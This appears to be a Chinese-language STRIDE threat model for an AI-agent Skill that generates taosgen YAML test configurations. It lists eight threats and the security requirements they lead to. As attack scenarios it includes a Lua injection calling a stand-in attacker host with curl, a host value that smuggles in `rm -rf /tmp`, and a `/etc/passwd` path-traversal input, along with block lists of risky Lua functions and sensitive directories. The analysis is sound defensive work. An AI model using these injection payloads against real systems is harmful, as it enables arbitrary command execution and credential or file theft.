### 3. 分析报告

本报告针对 taosgen-config Skill 功能进行了威胁建模分析。该功能旨在为 Claude Code 等 AI Agent 提供智能化的 taosgen YAML 配置生成能力，支持 TDengine、MQTT、Kafka 三种目标系统，通过自然语言交互收集测试需求，自动获取官方文档并生成符合规范的性能测试配置，并通过临时运行进行配置验证。

- **核心发现：** 共识别出 `8` 个潜在威胁，其中 `高危` `2` 个，`中危` `5` 个，`低危` `1` 个。
- **主要风险场景：**
  - **注入攻击**：Lua 表达式字段和 shell 命令拼接存在代码注入与命令注入风险，taosgen 进程可能执行恶意代码。
  - **凭证泄露**：生成的 YAML 配置文件含明文凭证，存在被意外提交至版本控制或遗留在临时目录的风险。
  - **不安全默认配置引导**：默认使用明文传输协议（ws://）和不可靠投递参数（acks:0、qos:0），对生产环境用户存在误导风险。
- **结论：** 该 Skill 设计在提升 taosgen 易用性方面价值显著，但配置生成流程引入了输入注入和凭证暴露两类主要攻击面。在完成行动项（凭证安全警告、Lua/Shell 输入校验约束）后，整体安全风险可降至可接受水平。

### 4. 威胁识别与分析（STRIDE）

本 Skill 的数据流：用户自然语言输入 → Skill 指令处理（AI 推理层）→ 生成 YAML 配置 → taosgen 进程执行（验证阶段）→ 目标系统（TDengine/MQTT/Kafka）。

#### 4.1 关键实体与数据

| 实体/数据 | 描述 | 敏感性 |
| --- | --- | --- |
| 目标系统凭证 | DSN 密码（TDengine）、SASL 用户名/密码（Kafka）、MQTT 用户名/密码，明文写入生成的 YAML 配置 | 高 |
| Lua 表达式 | 用户在 `expr` 字段提供的表达式，由 taosgen 进程直接执行 | 高（可执行代码） |
| 生成的 YAML 配置文件 | 包含目标系统连接参数、凭证、Schema 定义的完整配置 | 高 |
| 临时配置文件 | 验证阶段生成的 `/tmp/test_config.yaml`，含凭证信息 | 高 |
| 主机地址参数 | 用户提供的 `{host}`，被拼入 shell 验证命令 | 中（可执行命令） |
| CSV 文件路径 | 用户提供的 `from_csv.file_path`，由 taosgen 进程读取 | 中 |
| 官方文档（WebFetch） | 从固定 URL 获取的 taosgen 官方参数文档 | 低 |

#### 4.2 威胁评估

| 威胁ID | **威胁描述/攻击场景** | **STRIDE** | **相关组件/数据流** | **风险等级** |
| --- | --- | --- | --- | --- |
| T-TGCFG-01 | **凭证明文写入版本控制**：生成的 YAML 配置中含明文凭证（DSN 密码、SASL 密码），用户按照 FS §13.1 建议将配置纳入 Git 版本控制后，凭证随代码库泄露给所有有权访问该仓库的人员。 | I（信息泄露） | 生成 YAML 配置 → 版本控制系统 | 中 |
| T-TGCFG-02 | **默认凭证被写入配置**：Skill 使用知名默认值 `root:taosdata` 生成 DSN（FS §7.0.1），攻击者可利用此默认凭证对未修改密码的 TDengine 实例发起认证攻击。 | S（仿冒） | DSN 默认值 → TDengine 连接 | 中 |
| T-TGCFG-03 | **Lua 表达式代码注入**：用户在 `expression` 类型的 `expr` 字段中注入恶意 Lua 代码（如 `os.execute("curl attacker.com")`），taosgen 进程在配置验证阶段直接执行该表达式，导致在运行 taosgen 的主机上执行任意命令。 | E（权限提升） | 用户输入 expr → taosgen 进程执行 | 高 |
| T-TGCFG-04 | **shell 命令注入（主机地址参数）**：FS §7.1 验证命令为 `timeout 10s taosgen -h {host} -c ...`，若用户提供恶意主机地址（如 `localhost; rm -rf /tmp`），且 Skill 未对其进行格式校验，则在拼接 shell 命令时触发注入，在用户主机上执行任意命令。 | E（权限提升） | 用户输入 host → shell 命令拼接 | 高 |
| T-TGCFG-05 | **CSV 路径遍历读取敏感文件**：用户提供 `from_csv.file_path: /etc/passwd`，taosgen 进程尝试以该路径读取 CSV 文件，导致敏感系统文件内容被读取，错误信息可能泄露文件内容或其存在性。 | I（信息泄露） | CSV 文件路径 → taosgen 文件读取 | 中 |
| T-TGCFG-06 | **不安全默认协议引导生产误用**：Skill 默认生成 TDengine `ws://`（明文）、Kafka `acks:"0"`、MQTT `qos:0` 的配置（FS §7.0.1/7.0.2/7.0.3），生产环境用户若直接复用测试配置，将在未加密通道传输生产数据，或在不可靠模式下写入关键时序数据。 | I（信息泄露）/T（篡改） | 默认配置模板 → 生产环境目标系统 | 中 |
| T-TGCFG-07 | **配置引导资源耗尽目标系统**：攻击者或误操作用户生成超大规模配置（如 1000000 张表、无限行数），直接在生产 TDengine/MQTT/Kafka 集群上执行，导致存储耗尽或服务不可用。 | D（拒绝服务） | 超大规模配置 → 目标系统资源 | 中 |
| T-TGCFG-08 | **临时配置文件信息残留**：FS §7.1 在 `/tmp/test_config.yaml` 中写入含凭证的配置，验证完成后删除。若删除操作因异常中断，凭证文件将遗留在共享 `/tmp` 目录，可被同机其他用户读取。 | I（信息泄露） | 临时配置文件 → 共享 /tmp 目录 | 低 |

### 5. 安全需求与设计约束

| 威胁ID | **转化后的安全需求/设计约束** | **类型** | **优先级** |
| --- | --- | --- | --- |
| T-TGCFG-01 | SEC-TGCFG-001（凭证安全提示）：Skill 生成含明文凭证的配置时，必须在输出末尾自动附加安全警告，说明该配置文件含有敏感凭证，不应直接提交至版本控制，建议使用环境变量替换敏感字段。 | 安全功能需求 | 高 |
| T-TGCFG-02 | SEC-TGCFG-002（默认凭证告知）：当 Skill 使用 `root:taosdata` 等已知默认凭证生成 DSN 时，必须在配置注释中明确标注"此为默认凭证，生产环境请修改密码"。 | 安全设计约束 | 中 |
| T-TGCFG-03 | SEC-TGCFG-003（Lua 表达式校验）：Skill 在将用户输入拼入 `expr` 字段前，应对表达式进行安全审查，识别并拒绝包含高危 Lua 函数（`os.*`、`io.*`、`require`、`load`、`dofile` 等）的表达式，并向用户说明原因。 | 安全设计约束 | 高 |
| T-TGCFG-04 | SEC-TGCFG-004（Shell 输入校验）：验证命令中的 `{host}` 参数必须经过格式校验（仅允许合法 IP 地址或主机名格式，拒绝包含特殊字符的输入），禁止将未验证的用户输入直接拼入 shell 命令字符串。 | 安全设计约束 | 高 |
| T-TGCFG-05 | SEC-TGCFG-005（文件路径白名单）：对 `from_csv.file_path` 进行路径安全校验，若路径指向系统敏感目录（/etc/、/proc/、/sys/、~/.ssh/ 等），Skill 应拒绝生成并提示用户使用合法的数据目录。 | 安全设计约束 | 中 |
| T-TGCFG-06 | SEC-TGCFG-006（场景感知安全默认值）：当用户描述为"可靠性优先"或"生产环境"场景时，Skill 必须自动将协议切换为加密版本（wss://、SASL_SSL、ssl://），并将可靠性相关参数调整为安全默认值（acks:all、qos:1）。 | 安全功能需求 | 中 |
| T-TGCFG-08 | SEC-TGCFG-007（临时文件安全删除）：临时配置文件应使用随机名称（如 `/tmp/taosgen_verify_<uuid>.yaml`）而非固定路径，验证完成后无论成功或失败均必须执行清理（trap 机制），并设置文件权限为 600（仅所有者可读写）。 | 安全设计约束 | 低 |
